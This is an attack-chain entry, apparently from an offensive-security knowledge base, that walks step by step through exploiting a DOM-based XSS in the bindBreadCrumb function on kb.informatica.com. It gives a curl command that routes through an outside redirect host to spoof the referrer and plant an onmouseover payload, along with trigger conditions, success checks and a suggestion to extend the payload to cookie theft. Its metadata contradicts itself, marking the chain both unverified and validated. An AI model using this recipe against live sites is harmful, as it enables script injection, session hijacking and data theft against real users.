---
id: ac-dom-xss-breadcrumb-referrer
tags:
  - xss
  - dom-based-xss
  - javascript-injection
  - referrer-spoofing
type: attack_chain
tools:
  - '[[tools/loc-php-referrer-controller]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-Referrer-for-XSS-Injection]]'
  - '[[procedures/Load-Target-Page-to-Trigger-Breadcrumb-Building]]'
  - '[[procedures/Hover-to-Execute-XSS-Payload]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:20.724Z'
description: >-
  A multi-stage attack exploiting a DOM-based XSS vulnerability in the
  bindBreadCrumb function on kb.informatica.com by injecting malicious
  JavaScript via a controlled HTTP referrer, leading to arbitrary code execution
  on hover.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# DOM-based XSS in Breadcrumb Function via Malicious Referrer

Multi-stage attack chain demonstrating exploitation of a DOM-based XSS vulnerability in the bindBreadCrumb JavaScript function on kb.informatica.com, where unencoded document.referrer is inserted into HTML attributes, allowing arbitrary JavaScript execution via a crafted referrer.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious Referrer] --> B[Navigate to Target Page]
    B --> C[Trigger Payload on Hover]
    C --> D[Arbitrary JS Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/loc-php-referrer-controller]]

### Target Environment

- Web platform (kb.informatica.com)
- JavaScript-enabled browser
- No specific ports or services beyond HTTP/HTTPS

### Initial Access Requirements

- Ability to control HTTP referrer (via custom redirect script)
- Victim navigation to target URL with 'myk' parameter
- No authentication required

## Detailed Attack Procedures

### Step 1: Craft Malicious Referrer
procedure: [[procedures/Craft-Malicious-Referrer-for-XSS-Injection]]

**Objective**: Set up a controlled HTTP referrer containing a JavaScript payload to inject into the breadcrumb link's href attribute.

**Instructions**: Use [[tools/loc-php-referrer-controller]] to create a redirect that spoofs the referrer as '//search.informatica.com/onmouseover=alert(document.domain)' and navigates to the target page. Ensure the 'myk' parameter is set to a non-empty value like 'xxx', the referrer does not contain '/home.aspx', and the CoveoSearchUrl cookie is empty.

```bash
# Example: Host loc.php on a server and access it with parameters
curl "http://spqr.zz.mu/loc.php?//search.informatica.com/onmouseover=alert(document.domain)&https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx"
```

**Expected Output**: Browser redirects to the target page with the malicious referrer set.

**Success Indicators**:
- Referrer header is spoofed successfully (verifiable via browser dev tools)
- Navigation completes without errors

### Step 2: Load Target Page to Trigger Breadcrumb Building
procedure: [[procedures/Load-Target-Page-to-Trigger-Breadcrumb-Building]]

**Objective**: Load the vulnerable page to execute the bindBreadCrumb function, which processes the malicious referrer and injects it into the DOM.

**Instructions**: After redirection, wait for the document to be ready. The $(document).ready(function(){ bindBreadCrumb(); }); triggers the function, which checks qString('myk') != '' and processes document.referrer if conditions are met (no /home.aspx, matches hostname). It then appends the vulnerable <a href='[referrer]'>Search Results</a> to #DynamicBreadcrumb.

```javascript
// Simulated trigger (occurs automatically on page load)
$(document).ready(function(){ bindBreadCrumb(); });
```

**Expected Output**: Breadcrumb element is dynamically added to the page with the injected href.

**Success Indicators**:
- Inspect DOM: #DynamicBreadcrumb contains the new <li> with malicious href
- No errors in console related to referrer processing

### Step 3: Hover to Execute XSS Payload
procedure: [[procedures/Hover-to-Execute-XSS-Payload]]

**Objective**: Trigger the onmouseover event in the injected href to execute the JavaScript payload.

**Instructions**: Position the mouse over the 'Search Results' link in the breadcrumb. The event handler from the payload executes, running arbitrary JavaScript like alert(document.domain), which can be extended for session hijacking or data theft.

```javascript
// Payload executes on hover: onmouseover=alert(document.domain)
```

**Expected Output**: Alert box pops up showing the domain, confirming XSS execution.

**Success Indicators**:
- JavaScript alert or other payload effect observed
- Potential for further actions like cookie theft verifiable in console

## Attack Chain Summary

### Key Achievements

1. Successful injection of malicious referrer without direct access to the target.
2. Automatic DOM manipulation on page load due to unescaped input handling.
3. Arbitrary JavaScript execution in the victim's browser context, enabling data exfiltration.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
